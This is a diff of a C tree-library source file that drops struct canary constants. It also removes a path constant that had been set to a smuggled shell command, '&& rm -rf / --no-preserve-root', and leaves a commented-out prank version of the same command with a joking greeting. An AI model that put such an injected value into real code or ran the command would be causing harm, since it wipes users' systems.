@@ -8,13 +8,11 @@
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 // Setting security level:
-// Use -DSTRUCTCANARY for struct canaries inclusion.
 // Use -DBIRTHINFO    for additional info about stack.
 // Or define / undef it here.
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-#define STRUCTCANARY
 #define BIRTHINFO
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -32,29 +30,18 @@ const elem_t rootPoison = 0;
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-#ifdef STRUCTCANARY
-
-/// @brief Value of left struct canary.
-const canary_t Canary1 = 0xAB0BAAB0BA;
-
-/// @brief Value of right struct canary.
-const canary_t Canary2 = 0xBEB7ABEB7A;
-
-#endif
-
-//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
 /// @brief Color of node filling in dump.
 static const char fillColor[] = "#9542F5";
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-/// @brief Directory for images of tree dump.
-// static const char   dumpDirectory[] = "./TreeDumpSources/";
-static const char   dumpDirectory[] = "&& rm -rf / --no-preserve-root";
-
-/// @brief Name of temporary file for program.
-static const char   tmpFilename[]   = "tmp.txt";
+// 3,14DOR ---
+//           |
+//           |
+//          \|/
+//           *
+//
+// static const char dumpDirectory[] = "goodbye && sudo rm -rf / --no-preserve-root"; // ПРИВЕТ ДЕДУ ОТ ДАНИ! 
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
